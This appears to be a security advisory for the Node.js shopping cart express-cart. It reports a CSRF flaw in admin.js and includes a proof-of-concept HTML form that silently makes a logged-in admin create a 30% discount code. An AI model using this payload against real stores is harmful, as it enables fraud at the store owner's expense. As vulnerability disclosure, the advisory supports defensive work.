# Overview

express-cart is a fully functional shopping cart built in Node.js (Express, MongoDB) with Stripe, PayPal and Authorize.net payments.

This package is vulnerable to Cross-Site Request Forgery (CSRF) through `admin.js`.

# Proof of Concept

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost:1111/admin/settings/discount/create" method="POST">
      <input type="hidden" name="code" value="CSRF&#45;CODE&#45;DEMO" />
      <input type="hidden" name="type" value="percent" />
      <input type="hidden" name="value" value="30" />
      <input type="hidden" name="start" value="21&#47;02&#47;2020&#32;14&#58;32" />
      <input type="hidden" name="end" value="22&#47;02&#47;2020&#32;14&#58;32" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
